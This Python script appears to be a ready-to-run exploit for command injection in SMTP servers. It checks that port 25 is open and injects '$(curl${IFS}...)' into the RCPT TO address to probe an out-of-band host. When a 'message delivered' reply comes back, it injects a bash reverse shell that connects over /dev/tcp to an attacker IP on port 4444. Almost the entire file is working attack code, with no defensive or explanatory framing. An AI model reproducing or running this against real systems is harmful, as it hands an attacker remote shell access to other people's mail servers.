import socket

def is_port_open(host, port, timeout=10):
    """
    Check if a specific port on a host is open.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def smtp_send_command(connection, command):
    """
    Send a command to the SMTP server and return its response.
    """
    connection.send(command)
    return connection.recv(1024).decode('utf-8')

def smtp_payload_check_vulnerability(host, port, oast, timeout=10):
    """
    Check if an SMTP server is vulnerable to a specific payload by using an OAST.
    """
    try:
        with socket.create_connection((host, port), timeout=timeout) as conn:
            smtp_send_command(conn, b'EHLO localhost\r\n')
            smtp_send_command(conn, b'MAIL FROM: <aaaa@mail.domain.com>\r\n')

            rcpt_to_payload = f'RCPT TO: <"aabbb$(curl${{IFS}}{oast})"@mail.domain.com>\r\n'.encode()
            smtp_send_command(conn, rcpt_to_payload)

            smtp_send_command(conn, b'DATA\r\n')
            response = smtp_send_command(conn, b'aaa\r\n.\r\n')
            smtp_send_command(conn, b'QUIT\r\n')
            
            return response

    except Exception as e:
        return f"Error: {str(e)}"

def smtp_payload_exploit_reverse_shell(host, port, local_ip, local_port, timeout=10):
    """
    Attempt to exploit an SMTP server with a reverse shell payload.
    """
    reverse_shell_payload = f'/bin/bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1'
    try:
        with socket.create_connection((host, port), timeout=timeout) as conn:
            smtp_send_command(conn, b'EHLO localhost\r\n')
            smtp_send_command(conn, b'MAIL FROM: <exploit@mail.domain.com>\r\n')

            rcpt_to_payload = f'RCPT TO: <"exploit$(bash -c \'{reverse_shell_payload}\')"@mail.domain.com>\r\n'.encode()
            smtp_send_command(conn, rcpt_to_payload)

            smtp_send_command(conn, b'DATA\r\n')
            response = smtp_send_command(conn, b'Exploit in action\r\n.\r\n')
            smtp_send_command(conn, b'QUIT\r\n')
            
            return response

    except Exception as e:
        return f"Error: {str(e)}"

def main():
    host = "target.domain.com"
    port = 25
    oast = "http://your-oast-url.com"
    local_ip = "your-local-ip"
    local_port = 4444

    if is_port_open(host, port):
        print(f"Port {port} is open on {host}")

        print("Checking for vulnerability...")
        response = smtp_payload_check_vulnerability(host, port, oast)
        print("SMTP Response (Vulnerability Check):\n", response)

        if "message delivered" in response:
            print("Vulnerability detected! Proceeding to exploitation...")

            exploit_response = smtp_payload_exploit_reverse_shell(host, port, local_ip, local_port)
            print("SMTP Response (Exploitation - Reverse Shell):\n", exploit_response)
        else:
            print("No vulnerability detected or unable to exploit.")
    else:
        print(f"Port {port} is closed on {host}")

if __name__ == "__main__":
    main()
